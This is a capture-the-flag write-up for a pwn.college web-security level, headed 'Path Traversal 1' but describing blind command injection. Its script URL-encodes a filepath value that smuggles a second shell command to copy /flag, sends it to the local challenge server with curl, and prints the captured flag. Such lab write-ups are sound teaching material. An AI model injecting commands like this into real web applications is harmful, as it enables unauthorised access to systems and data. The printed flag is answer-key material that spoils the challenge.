
# [Path Traversal 1](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-1)

## Problem

This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We've implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?

The webserver program is `/challenge/server`. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!
Programs tend to shell out to do complex internal computation. This means that you might not always get sent the resulting output, and you will need to do your attack blind. Try it in this level: without the output of your injected command, get the flag!


## Steps

Run `bash answer.bash`. After that read the file created in `/challenge/PWN` using `cat /challenge/PWN`
### solution.sh

```bash
# Performing URL Encoding
path_to_encode="/challenge/PWN ; cat /flag > /challenge/PWN" 
url_encoded_path=$(echo -n "$path_to_encode" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
curl -v "http://challenge.localhost:80/task?filepath=$url_encoded_path"
```

## Solution

`pwn.college{MI6AN2olIR0_pU3HGXTN9UR4gZ_.ddjN1YDL3MTM3QzW}`
